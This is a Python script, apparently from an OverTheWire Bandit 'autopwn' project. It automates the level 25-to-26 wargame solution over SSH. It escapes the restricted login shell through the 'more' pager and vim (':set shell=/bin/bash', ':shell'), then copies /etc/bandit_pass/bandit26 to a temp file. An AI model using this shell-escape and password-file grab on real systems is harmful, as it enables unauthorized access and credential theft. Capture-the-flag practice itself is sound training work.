import paramiko
import time

host = "bandit.labs.overthewire.org"
port = 2220
username = "bandit26"
key_file = "D:\\Proyectos\\owt_bandit_autopwn\\OWT_Bandit_AutoPwn\\resources\\bandit25_26\\id_rsa"  # Reemplaza con la ruta real

# Cargar clave privada
key = paramiko.RSAKey.from_private_key_file(key_file)

# Crear conexión SSH
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(host, port=port, username=username, pkey=key)

# Abrir canal interactivo con un pseudo-terminal PEQUEÑO
channel = client.invoke_shell(width=80, height=2)  # <--- ¡Truco aquí!
time.sleep(1)

# Leer salida inicial del more
# if channel.recv_ready():
#     output = channel.recv(4096).decode()
#     print("Inicial:\n", output)

# Escapar del more con !sh
channel.send("v")
channel.send("\n")
print("channel.send(\"v\")")
time.sleep(2)
channel.send(":set shell=/bin/bash")
channel.send("\n")
print("channel.send(\":set shell=/bin/bash\")")
time.sleep(2)
channel.send(":shell")
channel.send("\n")
print("channel.send(\":shell\")")
time.sleep(2)

# Ejecutar el comando para obtener la contraseña
channel.send("touch /tmp/tmp.jvyUzriGoW/test.txt")
channel.send("\n")
time.sleep(1)

channel.send("id")
channel.send("\n")
time.sleep(1)

channel.send("whoami")
channel.send("\n")
time.sleep(1)

# Paso 3: ya estamos en shell. Ejecutar comando
channel.send("cat /etc/bandit_pass/bandit26 > /tmp/tmp.jvyUzriGoW/pass.txt \n")
time.sleep(1)

# Leer todo el output que queda en el buffer
output = ""
start_time = time.time()
while True:
    if channel.recv_ready():
        output += channel.recv(1024).decode(errors="ignore")
    if time.time() - start_time > 5:  # espera de 5 seg
        break
    time.sleep(0.2)

print("=== OUTPUT ===")
print(output)

# Cerrar sesión
channel.send("exit\n")
client.close()
